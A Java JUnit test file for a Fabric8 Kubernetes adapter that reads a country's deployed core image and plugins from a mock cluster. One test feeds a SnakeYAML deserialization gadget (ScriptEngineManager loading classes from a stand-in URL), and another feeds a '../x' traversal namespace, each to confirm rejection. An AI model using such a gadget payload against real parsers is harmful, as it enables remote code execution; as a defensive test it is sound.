package io.synkra.kubernetes;

import static org.assertj.core.api.Assertions.assertThat;
import static org.assertj.core.api.Assertions.assertThatThrownBy;

import io.fabric8.kubernetes.api.model.ConfigMap;
import io.fabric8.kubernetes.client.ConfigBuilder;
import io.fabric8.kubernetes.client.KubernetesClient;
import io.fabric8.kubernetes.client.KubernetesClientBuilder;
import io.fabric8.kubernetes.client.server.mock.KubernetesMixedDispatcher;
import io.fabric8.kubernetes.client.server.mock.KubernetesMockServer;
import io.fabric8.mockwebserver.Context;
import io.fabric8.mockwebserver.MockWebServer;
import io.fabric8.mockwebserver.ServerRequest;
import io.fabric8.mockwebserver.ServerResponse;
import io.fabric8.mockwebserver.http.RecordedRequest;
import io.synkra.kubernetes.api.ClienteNoDisponibleException;
import io.synkra.kubernetes.api.LecturaPais;
import io.synkra.kubernetes.api.LecturaPais.PluginLeido;
import io.synkra.kubernetes.api.LecturaPaisInconsistenteException;
import io.synkra.kubernetes.api.NamespaceNoPermitidoException;
import io.synkra.kubernetes.api.ObjetosPais;
import io.synkra.kubernetes.api.PlanPais;
import io.synkra.kubernetes.api.PlanPais.PluginPlan;
import java.nio.file.Path;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.List;
import java.util.Queue;
import java.util.concurrent.TimeUnit;
import org.junit.jupiter.api.AfterEach;
import org.junit.jupiter.api.BeforeEach;
import org.junit.jupiter.api.Test;
import org.junit.jupiter.api.io.TempDir;
import org.snakeyaml.engine.v2.api.Load;
import org.snakeyaml.engine.v2.api.LoadSettings;

/**
 * U05-T06: {@code leerPais} contra el servidor simulado de Fabric8 en modo CRUD (basta para {@code GET}): los objetos
 * se siembran con lo que devuelve {@code construir}. Nunca se toca el kubeconfig real.
 */
class LeerPaisTest {

    private static final String NS = "synkra-pe";
    private static final String CORE = "localhost:5001/core-pe@sha256:" + "a".repeat(64);
    private static final String SHA_F = "1".repeat(64);
    private static final String SHA_I = "2".repeat(64);
    private static final PlanPais PLAN = new PlanPais("pe", CORE, List.of(
            new PluginPlan("impuestos", "2.0.1", SHA_I), new PluginPlan("facturacion", "1.2.0", SHA_F)));

    @TempDir
    Path casaFalsa;

    KubernetesMockServer servidor;
    KubernetesClient cliente;
    AdaptadorFabric8 adaptador;
    private int leidas;
    private String propiedadCasa;
    private String propiedadKubeconfig;

    @BeforeEach
    void arranca() {
        propiedadCasa = System.getProperty("user.home");
        propiedadKubeconfig = System.getProperty("kubeconfig");
        System.setProperty("user.home", casaFalsa.toString());
        System.setProperty("kubeconfig", casaFalsa.resolve("kubeconfig-falso").toString());
        var respuestas = new HashMap<ServerRequest, Queue<ServerResponse>>();
        servidor = new KubernetesMockServer(new Context(), new MockWebServer(), respuestas,
                new KubernetesMixedDispatcher(respuestas), false);
        servidor.init();
        try (var base = servidor.createClient()) {
            cliente = new KubernetesClientBuilder().withConfig(
                    new ConfigBuilder(base.getConfiguration()).withRequestRetryBackoffLimit(0).build()).build();
        }
        adaptador = new AdaptadorFabric8(cliente);
    }

    @AfterEach
    void para() {
        cliente.close();
        servidor.destroy();
        restaura("user.home", propiedadCasa);
        restaura("kubeconfig", propiedadKubeconfig);
    }

    private static void restaura(String clave, String valor) {
        if (valor == null) {
            System.clearProperty(clave);
        } else {
            System.setProperty(clave, valor);
        }
    }

    private ObjetosPais siembra(PlanPais plan) {
        ObjetosPais o = adaptador.construir(plan);
        cliente.apps().deployments().inNamespace(NS).resource(o.deployment()).create();
        cliente.configMaps().inNamespace(NS).resource(o.configMap()).create();
        return o;
    }

    private void cambiaConfigMap(String activos, String artefactos) {
        cliente.configMaps().inNamespace(NS).withName(ConstructorObjetosPais.NOMBRE_CONFIG).edit(c -> {
            c.getData().put(ConstructorObjetosPais.CLAVE_PLUGINS, activos);
            c.getData().put(ConstructorObjetosPais.CLAVE_ARTEFACTOS, artefactos);
            return c;
        });
    }

    private void terminaSiembra() throws Exception {
        int sembradas = servidor.getRequestCount();
        for (int i = 0; i < sembradas; i++) {
            servidor.takeRequest(5, TimeUnit.SECONDS);
        }
        leidas = sembradas;
    }

    private List<RecordedRequest> peticiones() throws Exception {
        List<RecordedRequest> r = new ArrayList<>();
        while (leidas < servidor.getRequestCount()) {
            r.add(servidor.takeRequest(5, TimeUnit.SECONDS));
            leidas++;
        }
        return r;
    }

    @Test
    void paisDesplegadoDevuelveElMismoCoreYLosMismosPlugins() throws Exception {
        siembra(PLAN);
        terminaSiembra();

        LecturaPais lectura = adaptador.leerPais("pe").orElseThrow();

        assertThat(lectura.pais()).isEqualTo("pe");
        assertThat(lectura.imagenCore()).isEqualTo(CORE);
        assertThat(lectura.plugins()).containsExactlyInAnyOrder(
                new PluginLeido("facturacion", "1.2.0", SHA_F), new PluginLeido("impuestos", "2.0.1", SHA_I));
    }

    @Test
    void paisSinNadaDesplegadoEsVacio() {
        assertThat(adaptador.leerPais("pe")).isEmpty();
    }

    @Test
    void configMapCambiadoAManoDevuelveLoQueCorreDeVerdad() {
        siembra(PLAN);
        cambiaConfigMap("- nombre: \"facturacion\"\n  version: \"1.3.0\"\n",
                SHA_F + " facturacion-1.3.0.jar\n");

        LecturaPais lectura = adaptador.leerPais("pe").orElseThrow();

        assertThat(lectura.plugins()).containsExactly(new PluginLeido("facturacion", "1.3.0", SHA_F));
    }

    @Test
    void pluginActivoSinLineaEnArtefactosLanzaYLoNombra() {
        siembra(PLAN);
        cambiaConfigMap("- nombre: \"facturacion\"\n  version: \"1.2.0\"\n- nombre: \"fantasma\"\n  version: \"9.9.9\"\n",
                SHA_F + " facturacion-1.2.0.jar\n");

        assertThatThrownBy(() -> adaptador.leerPais("pe"))
                .isInstanceOf(LecturaPaisInconsistenteException.class)
                .hasMessageContaining("pe").hasMessageContaining("fantasma");
    }

    @Test
    void lineaDeArtefactosSinPluginActivoLanza() {
        siembra(PLAN);
        cambiaConfigMap("[]\n", SHA_F + " facturacion-1.2.0.jar\n");

        assertThatThrownBy(() -> adaptador.leerPais("pe"))
                .isInstanceOf(LecturaPaisInconsistenteException.class).hasMessageContaining("facturacion");
    }

    @Test
    void yamlConEtiquetaDeTipoJavaLanzaSinConstruirObjetos() {
        siembra(PLAN);
        cambiaConfigMap("- !!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL [\"http://x/\"]]]]\n",
                SHA_F + " facturacion-1.2.0.jar\n");

        assertThatThrownBy(() -> adaptador.leerPais("pe"))
                .isInstanceOf(LecturaPaisInconsistenteException.class).hasMessageContaining("pe");
    }

    @Test
    void valorQueNoCumpleElFormatoDelPlanLanza() {
        siembra(PLAN);
        cambiaConfigMap("- nombre: \"facturacion\"\n  version: \"1.2.0\"\n", "corto facturacion-1.2.0.jar\n");

        assertThatThrownBy(() -> adaptador.leerPais("pe"))
                .isInstanceOf(LecturaPaisInconsistenteException.class).hasMessageContaining("facturacion");
    }

    @Test
    void deploymentSinConfigMapLanza() {
        ObjetosPais o = adaptador.construir(PLAN);
        cliente.apps().deployments().inNamespace(NS).resource(o.deployment()).create();

        assertThatThrownBy(() -> adaptador.leerPais("pe"))
                .isInstanceOf(LecturaPaisInconsistenteException.class)
                .hasMessageContaining("pe").hasMessageContaining(ConstructorObjetosPais.NOMBRE_CONFIG);
    }

    @Test
    void configMapSinDeploymentLanza() {
        ObjetosPais o = adaptador.construir(PLAN);
        cliente.configMaps().inNamespace(NS).resource(o.configMap()).create();

        assertThatThrownBy(() -> adaptador.leerPais("pe"))
                .isInstanceOf(LecturaPaisInconsistenteException.class)
                .hasMessageContaining(ConstructorObjetosPais.NOMBRE_CORE);
    }

    @Test
    void paisInvalidoYSinClienteSeRechazanSinPeticiones() throws Exception {
        terminaSiembra();
        for (String pais : new String[] {"PE", "p", "../x", null}) {
            assertThatThrownBy(() -> adaptador.leerPais(pais)).isInstanceOf(NamespaceNoPermitidoException.class);
        }
        assertThatThrownBy(() -> new AdaptadorFabric8(null).leerPais("pe")).isInstanceOf(ClienteNoDisponibleException.class);
        assertThatThrownBy(() -> new AdaptadorFabric8(null).leerPais("PE")).isInstanceOf(NamespaceNoPermitidoException.class);
        assertThat(peticiones()).isEmpty();
    }

    @Test
    void todasLasPeticionesSonGetAlNamespaceDelPais() throws Exception {
        siembra(PLAN);
        terminaSiembra();

        adaptador.leerPais("pe");

        List<RecordedRequest> r = peticiones();
        assertThat(r).hasSize(2);
        assertThat(r).allSatisfy(p -> {
            assertThat(p.getMethod()).isEqualTo("GET");
            assertThat(p.getPath()).contains("/namespaces/" + NS + "/");
        });
    }

    @Test
    void pluginsActivosQueEscribeConstruirEsUnaListaEnLaRaiz() {
        ConfigMap c = adaptador.construir(PLAN).configMap();
        Object raiz = new Load(LoadSettings.builder().build()).loadFromString(c.getData().get(ConstructorObjetosPais.CLAVE_PLUGINS));

        assertThat(raiz).isInstanceOf(List.class);
        assertThat((List<?>) raiz).containsExactly(
                java.util.Map.of("nombre", "facturacion", "version", "1.2.0"),
                java.util.Map.of("nombre", "impuestos", "version", "2.0.1"));

        ConfigMap vacio = adaptador.construir(new PlanPais("pe", CORE, List.of())).configMap();
        Object raizVacia = new Load(LoadSettings.builder().build()).loadFromString(vacio.getData().get(ConstructorObjetosPais.CLAVE_PLUGINS));
        assertThat(raizVacia).isInstanceOf(List.class).asList().isEmpty();
    }
}
